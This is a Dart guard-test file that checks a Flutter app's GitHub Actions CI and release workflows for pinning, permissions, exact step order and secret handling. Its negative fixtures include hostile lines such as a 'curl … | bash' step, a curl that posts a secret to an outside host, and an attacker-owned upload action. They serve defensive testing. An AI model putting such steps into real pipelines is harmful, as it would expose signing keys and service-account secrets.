@Tags(['guard'])
library;

// Guard for #18: every action in every workflow is pinned, every workflow
// declares its permissions and its concurrency, and the two files that state
// the Flutter version agree.
//
// Why a guard rather than review: an unpinned action is a third party that can
// change between the run that went green and the run that ships, inside the
// merge gate. The plugin's own lessons name this as the failure that has
// bitten before, and "we will remember to pin" is not a control.
//
// What this does NOT cover: whether a pinned major is current — that is
// Dependabot's job, which is why the `github-actions` ecosystem is asserted
// here too. Nor whether the required-status-check context string matches the
// job name; that lives in the repository ruleset and is recorded on the issue.
import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';

import 'repo_files.dart';
import 'workflow_rules.dart';
import 'workflow_yaml.dart';

const _workflowDir = '.github/workflows';

List<String> _workflowFiles() {
  final dir = Directory('${repoRoot.path}/$_workflowDir');
  if (!dir.existsSync()) return const [];
  return dir
      .listSync() // top level only, deliberately: nothing nested runs
      .whereType<File>()
      .map((f) => f.path.substring(repoRoot.path.length + 1))
      .where((p) => p.endsWith('.yml') || p.endsWith('.yaml'))
      .toList()
    ..sort();
}

/// A minimal, valid workflow around [steps].
///
/// The rules parse now, so a fixture must be a real document rather than a
/// loose fragment — which is the point: a fragment could never have exercised
/// a flow mapping, an anchor or a second job.
String _workflow(String steps) =>
    'name: Fixture\n'
    'on: workflow_dispatch\n'
    'permissions:\n'
    '  contents: read\n'
    'concurrency: fixture\n'
    'jobs:\n'
    '  a:\n'
    '    runs-on: ubuntu-latest\n'
    '    steps:\n'
    '$steps';

/// One step whose `run:` is [script], as a block scalar.
String _runStep(String script) {
  final indented = script.split('\n').map((l) => '          $l').join('\n');
  return '      - run: |\n$indented\n';
}

/// Every structural property #20's criteria depend on, as one function so
/// the negative test below can run it against a mutated workflow and
/// require it to fail. An assertion with no proof that it can fail is what
/// #154 was.
/// The command a step runs, as one line, or null when it runs none.
///
/// `contains` was the wrong question: appending `|| true` keeps the substring,
/// so `tools/gate.sh || true` satisfied an assertion whose whole point was
/// that CI obeys the gate (#167). A step whose job is "run this and let it
/// decide" has exactly one correct body, so the assertion is equality.
String? _soleCommand(WorkflowStep? step) {
  final run = step?.run;
  if (run == null) return null;
  final lines = run
      .split('\n')
      .map((l) => l.trim())
      .where((l) => l.isNotEmpty && !l.startsWith('#'))
      .toList();
  return lines.length == 1 ? lines.single : null;
}

/// [step] must run exactly [command] — no `|| true`, no second line, no
/// trailing conjunction that could swallow its exit status.
void _expectRunsExactly(WorkflowStep? step, String command, String why) {
  expect(step, isNotNull, reason: '$why: the step is gone');
  expect(
    _soleCommand(step),
    command,
    reason:
        '$why must run `$command` and nothing else, so that its exit '
        'status is the step\'s. Found: ${step!.run?.replaceAll('\n', ' ⏎ ')}',
  );
}

/// No job anywhere runs on someone else's machine, or in a deployment
/// environment carrying its own secrets and reviewers.
///
/// Asserted in `_assertReleaseShape` only, so `runs-on: attacker-self-hosted`
/// on ci.yml's gate job was green — and ci.yml is `workflow_call`ed with
/// `secrets: inherit` (#197).
void _assertRunnerAndEnvironment(Workflow wf) {
  for (final job in wf.jobs) {
    if (job.uses != null) continue;
    expect(
      job.runsOn,
      'ubuntu-latest',
      reason:
          '${wf.path}: job `${job.name}` runs on `${job.runsOn}`. A '
          'self-hosted runner would see every secret this workflow holds',
    );
    expect(
      job.environment,
      isNull,
      reason:
          '${wf.path}: job `${job.name}` declares environment '
          '`${job.environment}`, which carries its own secrets and reviewers',
    );
  }
}

/// Every Play upload in a workflow, as `job.step`.
///
/// The "exactly one upload in the whole file" rule lived only in
/// _assertReleaseShape, so the class #169 closed was open one file over:
/// release.yml's gate job is `uses: ./.github/workflows/ci.yml` with
/// `secrets: inherit`, which puts PLAY_SERVICE_ACCOUNT_JSON in scope inside
/// ci.yml on a tag push — and an upload step added there was green (#182).
List<String> _playUploads(Workflow wf) => [
  for (final job in wf.jobs)
    for (final step in job.steps)
      if (_isPlayUpload(step)) '${job.name}.${step.id ?? step.index}',
];

/// No workflow but release.yml may talk to Play at all.
void _expectNoPlayUpload(Workflow wf) {
  expect(
    _playUploads(wf),
    isEmpty,
    reason:
        'upload-scope: ${wf.path} contains a Play upload step. Only '
        'release.yml may upload, and only from `ship`. This file runs with '
        'the same secrets — ci.yml through `secrets: inherit` on a tag push',
  );
}

/// Everything #18's criteria depend on in ci.yml. A function, not an
/// inline test, so the negative battery below can run it against a
/// mutated file — the release side had that and this did not (#170).
void _assertCiShape(Workflow ci) {
  expect(ci.problem, isNull);
  // Equality, not containsAll. `containsAll` is one-directional: it says
  // the expected triggers are present and nothing about what was added
  // beside them, so `pull_request_target` — which runs fork code in the
  // BASE repository's context, with its secrets — was green (#170).
  // release.yml already asserted its trigger by equality, so the right
  // form was available and the weaker one was chosen here.
  expect(
    ci.triggers..sort(),
    ['pull_request', 'workflow_call'],
    reason:
        'ci-shape: exactly these triggers. pull_request_target would run '
        'a fork\'s code against this repository\'s secrets',
  );
  expect(ci.jobs.map((j) => j.name).toList(), [
    'gate',
    'mutations',
  ], reason: 'ci-shape: exactly these jobs — another one can run anything');
  _expectRunsExactly(
    ci.job('mutations')!.stepById('mutations'),
    'tools/mutation_check.py',
    'ci-shape: the mutation battery must actually run',
  );
  _expectNoPlayUpload(ci);
  _assertRunnerAndEnvironment(ci);

  // Same inversion as release.yml, and the same reason: `continue-on-error`
  // on `shellcheck` was green because only three steps were checked (#197).
  // `artifact` is the one legitimate exception: it uploads the PR bundle and
  // must NOT run when release.yml calls this workflow on a tag. Named, so a
  // second exception is a deliberate edit rather than a silence.
  const ciMayBeConditional = {'artifact'};
  for (final job in ci.jobs) {
    for (final step in job.steps) {
      if (ciMayBeConditional.contains(step.id)) {
        expect(
          step.ifExpression,
          "github.event_name == 'pull_request'",
          reason:
              'ci-shape: `${step.id}` may be conditional only on being a '
              'pull request — that is why it is exempt',
        );
        expect(step.continueOnError, isFalse);
        continue;
      }
      expect(
        step.isUnconditional,
        isTrue,
        reason:
            'ci-shape: step `${step.id ?? step.index}` of `${job.name}` is '
            'conditional (if: ${step.ifExpression}, continue-on-error: '
            '${step.continueOnError}) — nothing in the gate may be skippable',
      );
    }
  }

  // The step SET, not just three ids and two indexes. An added
  // `run: curl -sSL … | bash` in the gate job was invisible, and so was a
  // full Play upload (#182).
  expect(
    ci.job('gate')!.steps.map((s) => s.id).toList(),
    [
      'checkout',
      'shellcheck',
      'java',
      'flutter',
      'deps',
      'guards',
      'gate',
      'artifact',
    ],
    reason:
        'ci-shape: exactly these steps in this order — an added step in the '
        'gate job runs with whatever secrets the caller inherited',
  );
  expect(ci.job('mutations')!.steps.map((s) => s.id).toList(), [
    'checkout',
    'java',
    'flutter',
    'deps',
    'mutations',
  ], reason: 'ci-shape: exactly these steps in the mutations job');
  for (final job in ci.jobs) {
    // `if: false` on the gate JOB disabled the entire merge gate with the
    // suite green — and `gate` is the repository's one required status
    // check, which a skipped job does not block. Every criterion below is
    // about the steps of a job nothing required to run. _assertReleaseShape
    // already asserted this for `ship`, so the right form was in the same
    // file and the weaker one was used (#189).
    expect(
      job.ifExpression,
      isNull,
      reason:
          'ci-shape: job `${job.name}` carries `if: ${job.ifExpression}`. A '
          'skipped job reports as skipped, and a skipped required check does '
          'not block a merge',
    );
    expect(
      job.continueOnError,
      isFalse,
      reason:
          'ci-shape: job `${job.name}` carries `continue-on-error`, so '
          'its failure would not block the merge it exists to block',
    );
  }

  final gate = ci.job('gate');
  expect(gate, isNotNull, reason: 'ci-shape: no gate job');
  final ids = gate!.steps.map((s) => s.id).toList();
  expect(ids.first, 'checkout');
  // Never compared to anything: `./does-not-exist` makes Shellcheck scan
  // nothing and still pass, and `severity: error` silently stops it
  // reporting warnings (#170).
  final shellcheck = gate.stepById('shellcheck')!;
  expect(shellcheck.uses, 'ludeeus/action-shellcheck@2.0.0');
  expect(
    shellcheck.with_['scandir'],
    './tools',
    reason: 'ci-shape: Shellcheck must scan the scripts directory',
  );
  expect(
    shellcheck.with_['severity'],
    'warning',
    reason: 'ci-shape: raising the severity floor hides findings',
  );
  expect(
    ids.indexOf('shellcheck'),
    1,
    reason:
        'ci-shape: Shellcheck runs before the toolchain — it takes '
        'seconds and a shell error should not wait for Gradle',
  );

  _expectRunsExactly(
    gate.stepById('deps'),
    'flutter pub get --enforce-lockfile',
    'ci-shape: dependencies must resolve against the lockfile',
  );
  _expectRunsExactly(
    gate.stepById('guards'),
    'flutter test --no-pub --tags guard',
    'ci-shape: the invariant guards must be their own step',
  );
  _expectRunsExactly(
    gate.stepById('gate'),
    'tools/gate.sh',
    'ci-shape: the gate step must run the same script as local',
  );

  for (final id in const ['deps', 'guards', 'gate']) {
    expect(
      gate.stepById(id)!.isUnconditional,
      isTrue,
      reason: 'ci-shape: `$id` must not be skippable',
    );
  }

  final artifact = gate.steps.firstWhere(
    (s) => (s.uses ?? '').contains('upload-artifact'),
  );
  expect(artifact.with_['retention-days'], '7');
  expect(artifact.with_['if-no-files-found'], 'error');
}

/// Lines that end a command's exit status rather than letting it fail.
///
/// `|| true` appended to a step's last command makes the step green whatever
/// the command did. #167 converted six assertions to equality, which catches
/// this for single-command steps; a multi-line body needs a different check,
/// and `keystore_check` and `build` had none at all (#189).
///
/// A trailing `|| true` on a cleanup line inside a longer script is often
/// deliberate, so this looks only at lines running a project tool or keytool
/// — the commands whose failure is the point of the step.
List<String> _swallowsFailure(String body) {
  // Join backslash continuations FIRST. Without this the scan has the defect
  // it is checking for: `keytool ... \` on one line and `-alias ... || true`
  // on the next are different lines (#183, #189).
  final joined = body.replaceAll(RegExp(r'\\\n\s*'), ' ');
  final offenders = <String>[];
  for (final raw in joined.split('\n')) {
    // Comments stripped. `|| true # tolerate a wrong alias` reinstated the
    // defect outright, because this helper never stripped them — while the
    // sibling rule twenty lines away has had `_stripComment` all along
    // (#197).
    final line = raw.split('#').first.trim();
    if (line.isEmpty) continue;

    // `set +e` disarms the whole body, so it is its own offence rather than
    // something to look for at the end of a line (#197).
    if (RegExp(r'(^|[;&|(]\s*)set\s+\+[a-z]*e').hasMatch(line)) {
      offenders.add(line);
      continue;
    }

    // `gh` was missing, and `gh release upload` is the entire point of the
    // `asset` step — the step #138's fix exists for (#197).
    final runsSomething = RegExp(
      r'(^|\s)(tools/\S+|keytool|flutter|gh|base64|sha256sum|curl|unzip)\b',
    ).hasMatch(line);
    if (!runsSomething) continue;

    // Every spelling of "and do not fail", not one. `|| true` was the only
    // form matched, so `|| :`, `|| /bin/true`, `|| exit 0` and a trailing
    // semicolon all walked past (#197).
    if (RegExp(r'\|\|\s*(true|:|/bin/true|/usr/bin/true|exit\s+0)\s*;?\s*$')
        .hasMatch(line)) {
      offenders.add(line);
    }
  }
  return offenders;
}

/// A step that hands the service-account key to a Play upload action.
/// Matched on the action's repository path rather than a substring of the
/// whole `uses:`, so a lookalike under another owner is not this (#169).
bool _isPlayUpload(WorkflowStep step) {
  final uses = step.uses;
  if (uses == null) return false;
  final path = uses.split('@').first;
  return path.endsWith('/upload-google-play') ||
      step.with_.containsKey('serviceAccountJsonPlainText');
}

void _assertReleaseShape(Workflow wf) {
  expect(wf.problem, isNull);

  // Only a version tag may start it. `branches: [main]` would ship on
  // every merge.
  expect(wf.triggers, ['push'], reason: 'release-shape: triggers');
  expect(wf.pushTags, [
    'v*',
  ], reason: 'release-shape: only a version tag ships');
  expect(
    wf.pushBranches,
    isEmpty,
    reason: 'release-shape: a branch filter would ship on every merge',
  );

  expect(
    wf.jobs.map((j) => j.name).toList(),
    ['gate', 'ship', 'report-gate-failure'],
    reason:
        'release-shape: exactly these three jobs — an added job runs with '
        'the same secrets and nothing above constrains it',
  );

  final gate = wf.job('gate');
  expect(gate, isNotNull, reason: 'release-shape: no gate job');
  expect(
    gate!.uses,
    './.github/workflows/ci.yml',
    reason:
        'release-shape: the gate must CALL the pull-request workflow, '
        'not restate or replace its steps',
  );
  expect(gate.secretsInherit, isTrue);
  expect(gate.steps, isEmpty, reason: 'release-shape: a `uses:` job');

  final ship = wf.job('ship');
  expect(ship, isNotNull);
  expect(ship!.needs, contains('gate'));
  expect(
    ship.ifExpression,
    isNull,
    reason: 'release-shape: an `if:` on ship would let it run on a red gate',
  );
  expect(wf.job('report-gate-failure')!.needs, contains('gate'));

  final ids = ship.steps.map((s) => s.id).toList();
  expect(ids.first, 'checkout');
  expect(
    ids[1],
    'secrets_present',
    reason: 'release-shape: the secrets assertion runs before any build',
  );

  // No job may be non-blocking. GitHub treats a `continue-on-error` job as
  // succeeded for everything that `needs:` it, so `continue-on-error: true`
  // on `gate` lets `ship` upload on a red gate — and every assertion about
  // `ship` above still passes (#169).
  for (final job in wf.jobs) {
    expect(
      job.continueOnError,
      isFalse,
      reason:
          'release-shape: job `${job.name}` (line ${job.line}) carries '
          '`continue-on-error`, which makes its failure non-blocking for '
          'everything that needs it',
    );
  }

  // Exactly one step in the WHOLE FILE may talk to Play, and everything that
  // proves the bundle must run before it — unconditionally. Scoping this to
  // `ship` let a second job upload to production untouched (#169).
  final playSteps = <({WorkflowJob job, WorkflowStep step})>[
    for (final job in wf.jobs)
      for (final step in job.steps)
        if (_isPlayUpload(step)) (job: job, step: step),
  ];
  expect(
    playSteps.map((p) => '${p.job.name}.${p.step.id ?? p.step.index}').toList(),
    ['ship.play'],
    reason:
        'release-shape: exactly one Play upload, in `ship` — a second one '
        'anywhere in the file can name any track it likes',
  );
  final play = playSteps.single.step;

  // The exact pin, not `contains`. `attacker/upload-google-play@v1` contains
  // the same substring and would be handed the service-account key (#169).
  expect(
    play.uses,
    'r0adkll/upload-google-play@v1',
    reason: 'release-shape: the upload action must be the pinned one',
  );
  expect(
    play.with_['track'],
    'internal',
    reason: 'release-shape: automation never touches production',
  );
  expect(play.with_['status'], 'completed');
  // Never asserted before: the upload could name another app entirely, or a
  // file the gate never scanned (#169).
  expect(
    play.with_['packageName'],
    'com.honestarcade.sudoku',
    reason: 'release-shape: the upload must name THIS package',
  );
  expect(
    play.with_['releaseFiles'],
    'build/app/outputs/bundle/release/app-release.aab',
    reason:
        'release-shape: the upload must ship the bundle the scan and the '
        'certificate check actually ran against',
  );
  expect(
    play.isUnconditional,
    isTrue,
    reason:
        'release-shape: `if:` or `continue-on-error` on the upload '
        'would ship after an earlier failure',
  );

  final playIndex = ship.steps.indexOf(play);
  for (final earlier in const [
    'secrets_present',
    'version',
    'keystore_check',
    'build',
    'scan',
    'cert',
  ]) {
    final index = ship.indexOfId(earlier);
    expect(
      index,
      inInclusiveRange(0, playIndex - 1),
      reason: 'release-shape: `$earlier` must run before the upload',
    );
    expect(
      ship.steps[index].isUnconditional,
      isTrue,
      reason:
          'release-shape: `$earlier` must be unconditional, or the '
          'upload can be reached without it',
    );
  }
  expect(ship.indexOfId('summary'), greaterThan(playIndex));

  // The step SET. Only `summary`'s index was bounded, so a step inserted
  // between `play` and `summary` that curls the bundle out was green — a
  // defect written out verbatim in #169's own body and closed without being
  // fixed (#182).
  expect(
    ship.steps.map((s) => s.id).toList(),
    [
      'checkout',
      'secrets_present',
      'version',
      'java',
      'flutter',
      'deps',
      'keystore',
      'keystore_check',
      'build',
      'scan',
      'cert',
      'sidecar',
      'artifact',
      'asset',
      'play',
      'summary',
      'name_failure',
      'shred',
    ],
    reason:
        'release-shape: exactly these steps in this order. Anything else in '
        '`ship` runs with all five secrets and the built bundle on disk',
  );

  // Modelled by #169's Fix line and read by nothing until now (#182).
  _assertRunnerAndEnvironment(wf);
  for (final job in wf.jobs) {
    if (job.uses != null) continue;
    expect(
      job.runsOn,
      'ubuntu-latest',
      reason:
          'release-shape: job `${job.name}` runs on `${job.runsOn}`. A '
          'self-hosted runner would see every secret this workflow holds',
    );
    expect(
      job.environment,
      isNull,
      reason:
          'release-shape: job `${job.name}` declares environment '
          '`${job.environment}`, which carries its own secrets and reviewers',
    );
  }

  // The steps that enforce invariant 1 and the signing identity must
  // actually run their scripts.
  _expectRunsExactly(
    ship.stepById('scan'),
    'tools/check_aab.sh',
    'release-shape: `scan` must run the permission scan',
  );
  _expectRunsExactly(
    ship.stepById('cert'),
    'tools/verify_upload_cert.sh',
    'release-shape: `cert` must run the certificate check',
  );
  // `contains`, and `|| true` keeps the substring — so #167's literal title
  // ("every `run:` assertion is a substring") was still true of this one
  // line after #167 closed. The executing tests stub keytool with exit 0, so
  // they never exercise it failing either (#189).
  final keystoreCheck = ship.stepById('keystore_check')!.run!;
  expect(
    keystoreCheck,
    contains(r'-alias "$HS_KEY_ALIAS"'),
    reason: 'release-shape: without -alias the check passes a wrong alias',
  );
  // EVERY step with a body, not four named ones. `version`'s `|| true` made
  // a malformed tag stop failing the build, and it was outside the scanned
  // set (#197).
  for (final step in ship.steps) {
    final body = step.run;
    if (body == null) continue;
    final swallowed = _swallowsFailure(body);
    expect(
      swallowed,
      isEmpty,
      reason:
          'release-shape: `${step.id ?? step.index}` discards the exit '
          'status of $swallowed — the step then reports success whatever '
          'happened inside it',
    );
  }

  // The INVERSE of the old shape. Seven steps were required to be
  // unconditional and the other nineteen could carry anything; now every
  // step must be unconditional except a named few, so a new step is safe by
  // default rather than unguarded by default (#197).
  const mayBeConditional = {'summary', 'name_failure', 'shred'};
  for (final step in ship.steps) {
    if (mayBeConditional.contains(step.id)) continue;
    expect(
      step.isUnconditional,
      isTrue,
      reason:
          'release-shape: step `${step.id ?? step.index}` is conditional '
          '(if: ${step.ifExpression}, continue-on-error: '
          '${step.continueOnError}). Only ${mayBeConditional.join(', ')} may '
          'be, and they must be reached on the failure path on purpose',
    );
  }
  expect(
    ship.stepById('shred'),
    isNotNull,
    reason: 'release-shape: the keystore must be deleted',
  );
  expect(ship.stepById('shred')!.ifExpression, 'always()');

  final artifact = ship.steps.firstWhere(
    (s) => (s.uses ?? '').contains('upload-artifact'),
  );
  expect(artifact.with_['retention-days'], '30');
  // Named by AC3 and asserted by nothing — renaming it to `bundle` was green
  // (#198). The tag in the name is how a run's artifact is identified later.
  expect(
    artifact.with_['name'],
    'honest-sudoku-signed-\${{ github.ref_name }}',
    reason: 'release-shape: the artifact name must carry the tag',
  );
}

void main() {
  group('the repository as it stands', () {
    test('there is at least one workflow', () {
      // An empty or missing directory fails rather than passing vacuously.
      // Every other test in this group iterates the list, so without this one
      // the whole file would go green the moment CI was deleted.
      expect(
        _workflowFiles(),
        isNotEmpty,
        reason:
            'no-workflows: $_workflowDir holds no .yml or .yaml file, so '
            'nothing gates a pull request',
      );
    });

    test('every action is pinned to a fixed, non-floating ref', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          unpinnedUses(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(offenders, isEmpty, reason: describeOffenders('pins', offenders));
    });

    test('every workflow declares its permissions and never write-all', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          permissionOffenders(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('permissions', offenders),
      );
    });

    test('every workflow declares a concurrency group', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          concurrencyOffenders(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('concurrency', offenders),
      );
    });

    test(
      'no workflow lets a secret or an untrusted value reach a run: body',
      () {
        final offenders = <String>[];
        for (final path in _workflowFiles()) {
          final text = readFile(path);
          offenders.addAll(
            secretsInRunOffenders(path, text).map((o) => o.toString()),
          );
          offenders.addAll(
            untrustedInRunOffenders(path, text).map((o) => o.toString()),
          );
          offenders.addAll(
            shellTraceOffenders(path, text).map((o) => o.toString()),
          );
        }
        expect(
          offenders,
          isEmpty,
          reason: describeOffenders('secrets', offenders),
        );
      },
    );

    test('ci.yml keeps the structure #18 depends on', () {
      // Nothing asserted the story's own workflow: the #151 assertions were
      // written for release.yml only, so changing the artifact retention,
      // dropping `--enforce-lockfile`, or deleting the guards step were all
      // green (#165).
      _assertCiShape(
        Workflow.parse(
          '.github/workflows/ci.yml',
          readFile('.github/workflows/ci.yml'),
        ),
      );
    });

    test('the ci-shape rule catches each way the gate can be widened', () {
      final text = readFile('.github/workflows/ci.yml');
      final mutations = <String, String Function(String)>{
        'pull_request_target added': (t) => t.replaceFirst(
          'on:\n  pull_request:\n',
          'on:\n  pull_request:\n  pull_request_target:\n',
        ),
        'a second job that runs anything': (t) =>
            '$t'
            '  extra:\n'
            '    runs-on: ubuntu-latest\n'
            '    steps:\n'
            '      - run: curl -sSL https://example.test/x | bash\n',
        'continue-on-error on the gate job': (t) => t.replaceFirst(
          '  gate:\n',
          '  gate:\n    continue-on-error: true\n',
        ),
        'shellcheck scans nothing': (t) =>
            t.replaceFirst('scandir: ./tools', 'scandir: ./does-not-exist'),
        'shellcheck severity raised past warnings': (t) =>
            t.replaceFirst('severity: warning', 'severity: error'),
      };
      mutations.forEach((why, mutate) {
        final mutated = mutate(text);
        expect(mutated, isNot(text), reason: 'sanity: "$why" changed nothing');
        expect(
          Workflow.parse('ci.yml', mutated).problem,
          isNull,
          reason: 'sanity: "$why" produced YAML that does not parse',
        );
        expect(
          () => _assertCiShape(Workflow.parse('ci.yml', mutated)),
          throwsA(isA<TestFailure>()),
          reason: 'ci-shape-negative: "$why" was not caught',
        );
      });
    });

    test('release.yml keeps the structure its criteria depend on', () {
      _assertReleaseShape(
        Workflow.parse(
          '.github/workflows/release.yml',
          readFile('.github/workflows/release.yml'),
        ),
      );
    });

    test(
      'the release-shape rule catches each way the workflow can be gutted',
      () {
        // Every one of these kept the substring version green (#154).
        final text = readFile('.github/workflows/release.yml');
        final mutations = <String, String Function(String)>{
          'gate replaced by a no-op, strings left in a comment': (t) =>
              t.replaceFirst(
                RegExp(r'  gate:\n(.*\n)*?    secrets: inherit\n'),
                '  gate:\n'
                '    # Formerly: uses: ./.github/workflows/ci.yml / secrets: inherit\n'
                '    runs-on: ubuntu-latest\n'
                '    steps:\n'
                '      - name: Do nothing\n'
                "        run: 'true'\n",
              ),
          'permission scan replaced by true': (t) =>
              t.replaceFirst('run: tools/check_aab.sh', "run: 'true'"),
          'certificate check replaced by true': (t) =>
              t.replaceFirst('run: tools/verify_upload_cert.sh', "run: 'true'"),
          'track switched to production': (t) =>
              t.replaceFirst('track: internal', 'track: production'),
          // replaceFirstMapped, not replaceFirst: the plain form inserts the
          // replacement LITERALLY, so `$1` went in as two characters at
          // column 0, broke the block scalar, and the workflow stopped
          // parsing. The battery then saw `expect(wf.problem, isNull)` throw
          // and called it a catch — having proved that malformed YAML fails
          // to parse, not that the rule detects an `if:` on the upload (#172).
          'if: always() on the Play upload': (t) => t.replaceFirstMapped(
            RegExp(r'(      - id: play\n        name: [^\n]*\n)'),
            (m) => '${m[1]}        if: always()\n',
          ),
          'trigger changed to every push to main': (t) => t.replaceFirst(
            RegExp(r"    tags:\n      - 'v\*'\n"),
            '    branches:\n      - main\n',
          ),
          'keystore_check loses -alias': (t) =>
              t.replaceFirst(' \\\n            -alias "\$HS_KEY_ALIAS"', ''),
          // #169: all four of these were green when the assertions were
          // scoped to the `ship` job and matched the action by substring.
          'a second job uploads to production': (t) =>
              '$t'
              '  publish_prod:\n'
              '    needs: ship\n'
              '    runs-on: ubuntu-latest\n'
              '    steps:\n'
              '      - id: play2\n'
              '        uses: r0adkll/upload-google-play@v1\n'
              '        with:\n'
              '          packageName: com.honestarcade.sudoku\n'
              '          releaseFiles: app.aab\n'
              '          track: production\n'
              '          status: completed\n',
          'continue-on-error on the gate job': (t) => t.replaceFirst(
            '  gate:\n',
            '  gate:\n    continue-on-error: true\n',
          ),
          'the upload action is swapped for a fork': (t) => t.replaceFirst(
            'uses: r0adkll/upload-google-play@v1',
            'uses: attacker/upload-google-play@v1',
          ),
          'the upload names another package': (t) => t.replaceFirst(
            'packageName: com.honestarcade.sudoku',
            'packageName: com.attacker.sudoku',
          ),
          'the upload ships an unscanned file': (t) => t.replaceFirst(
            'releaseFiles: build/app/outputs/bundle/release/app-release.aab',
            'releaseFiles: /tmp/other.aab',
          ),
          'shred step deleted': (t) => t.replaceFirst(
            RegExp(
              r'      - id: shred\n'
              r'        name: [^\n]*\n'
              r'        if: always\(\)\n'
              r'        run: [^\n]*\n',
            ),
            '',
          ),
        };
        mutations.forEach((why, mutate) {
          final mutated = mutate(text);
          expect(
            mutated,
            isNot(text),
            reason: 'sanity: "$why" changed nothing',
          );
          // A mutation that breaks the YAML proves nothing: the shape
          // assertion throws on its first line and the battery records a
          // catch it did not earn (#172).
          expect(
            Workflow.parse('release.yml', mutated).problem,
            isNull,
            reason: 'sanity: "$why" produced YAML that does not parse',
          );
          expect(
            () => _assertReleaseShape(Workflow.parse('release.yml', mutated)),
            throwsA(isA<TestFailure>()),
            reason: 'release-shape-negative: "$why" was not caught',
          );
        });
      },
    );

    test('the secret rule refuses any secret reaching a run: body', () {
      // The point of the inversion: the spelling does not matter, because the
      // rule no longer asks what the script does with the value. Every one of
      // these passed the print-detecting version (#131, #141).
      for (final bad in const [
        r'        run: echo ${{ secrets.HS_KEY_PASS }}',
        r'        run: echo "${{ secrets['
            'HS_KEY_PASS'
            '] }}"',
        r'        run: echo "${{ secrets["HS_KEY_PASS"] }}"',
        r'        run: printf "%s" "${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}"',
        '        run: |\n          cat<<EOF\n'
            '          \${{ secrets.HS_KEY_PASS }}\n          EOF\n',
        r'        run: |'
            '\n'
            r"          cat <<'E-OF'"
            '\n'
            r'          ${{ secrets.HS_KEY_ALIAS }}'
            '\n'
            '          E-OF\n',
        r'        run: |'
            '\n'
            r'          tee /tmp/x <<< "${{ secrets.X }}"'
            '\n',
        r'        run: |'
            '\n'
            r'          curl -d "${{ secrets.X }}" https://x'
            '\n',
        r'        run: |'
            '\n'
            r'          echo "${{ toJSON(secrets) }}"'
            '\n',
        r'        run: |'
            '\n'
            r'          x=${{ secrets.X }}; echo "$x"'
            '\n',
      ]) {
        expect(
          secretsInRunOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'secrets-in-run: accepted `$bad`',
        );
      }
    });

    test('a secret used through env:, and a heredoc writing a file, pass', () {
      // Whole documents, not loose lines. As bare fragments these parsed to a
      // mapping with no `jobs:`, so there were no run scripts and the rule
      // returned empty whatever it did — the claim was never exercised. A
      // fragment carrying ${{ secrets.HS_KEY_PASS }}, ${{ github.ref_name }}
      // AND `set -x` returned zero offenders from all three rules (#177).
      for (final good in const [
        '      - env:\n'
            '          HS_KEY_PASS: \${{ secrets.HS_KEY_PASS }}\n'
            '        run: echo "\$HS_KEY_PASS" > /dev/null\n',
        // The false positive the print-detecting rule introduced: this writes
        // a signing properties file and prints nothing (#141).
        '      - run: |\n'
            '          cat <<EOF > key.properties\n'
            '          storePassword=\$HS_KEYSTORE_PASS\n'
            '          EOF\n',
        '      - run: base64 -d <<< "\$HS_KEYSTORE_B64" > "\$RUNNER_TEMP/k"\n',
      ]) {
        expect(
          secretsInRunOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'secrets-in-run-negative: refused `$good`',
        );
      }
    });

    test('the negative fixtures are real documents that the rules read', () {
      // The guard on the guard: if _workflow() ever stopped producing a
      // parseable workflow, every negative fixture above would go vacuous
      // again and pass by reading nothing. So one fixture is asserted to be
      // CAUGHT, proving the rules see through the wrapper at all (#177).
      final doc = _workflow(
        '      - env:\n'
        '          TAG: \${{ github.ref_name }}\n'
        '        run: echo "\${{ secrets.HS_KEY_PASS }}"\n'
        '          set -x\n',
      );
      expect(Workflow.parse('x.yml', doc).problem, isNull);
      expect(
        secretsInRunOffenders('x.yml', doc),
        isNotEmpty,
        reason: 'the wrapper must produce a document the rules actually read',
      );
    });

    test('untrusted github/inputs values are refused in a run: body', () {
      for (final bad in const [
        r'        run: echo "### Release ${{ github.ref_name }}"',
        r'        run: echo "${{ inputs.to_track }}"',
        '        run: |\n          echo "from \${{ inputs.from_track }}"\n',
        r'        run: echo "${{ github.event.pull_request.title }}"',
      ]) {
        expect(
          untrustedInRunOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'untrusted-in-run: accepted `$bad`',
        );
      }
    });

    test('step outputs and non-run uses of github. are allowed', () {
      // Whole documents, for the reason in the fixture above (#177).
      for (final good in const [
        '      - run: echo "\${{ steps.version.outputs.name }}"\n',
        "      - if: github.event_name == 'pull_request'\n"
            '        run: echo hello\n',
        '      - uses: actions/upload-artifact@v7\n'
            '        with:\n'
            '          name: honest-sudoku-aab-\${{ github.sha }}\n',
        '      - env:\n'
            '          TAG: \${{ github.ref_name }}\n'
            '        run: echo "\$TAG"\n',
      ]) {
        expect(
          untrustedInRunOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'untrusted-in-run-negative: refused `$good`',
        );
      }
    });

    test('every tracing spelling is refused', () {
      for (final bad in const [
        'set -x',
        'set -euxo pipefail',
        'foo; set -ex',
        'set -v',
        'set -o xtrace',
        'set -o verbose',
        // Each of these passed the firstMatch version (#141).
        'set -euo pipefail; set -x',
        'set -e -x',
        'set -o errexit -o xtrace',
        r'set -o "xtrace"',
        'bash -x tools/gate.sh',
        'sh -x script.sh',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'trace: accepted `$bad`',
        );
      }
      for (final good in const [
        'set -euo pipefail',
        'set -e',
        'settle -x',
        'set -o pipefail',
        'set -o errexit',
        'bash tools/gate.sh',
        'grep -v foo bar',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(_runStep(good))),
          isEmpty,
          reason: 'trace-negative: refused `$good`',
        );
      }
    });

    test('a tracing shell is refused at workflow, job and step level', () {
      // Only the step level was checked, so a two-character change to the
